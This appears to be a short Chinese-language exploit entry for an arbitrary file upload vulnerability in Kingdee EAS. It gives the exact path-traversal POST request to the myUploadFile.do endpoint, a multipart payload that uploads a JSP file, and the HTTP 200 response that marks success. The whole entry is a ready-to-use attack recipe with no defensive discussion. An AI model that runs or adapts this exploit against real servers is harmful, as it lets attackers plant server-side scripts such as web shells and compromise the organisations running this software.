# 金蝶EASmyUploadFile接口任意文件上传

金蝶 ｜ 文件上传 ｜ —
- **请求**：`POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1`

**Payload**
```
------test
Content-Disposition: form-data; name="myFile"; filename="test.jsp"
Content-Type: text/html
<%out.println("test");%>
------test--
```
- **响应特征**：200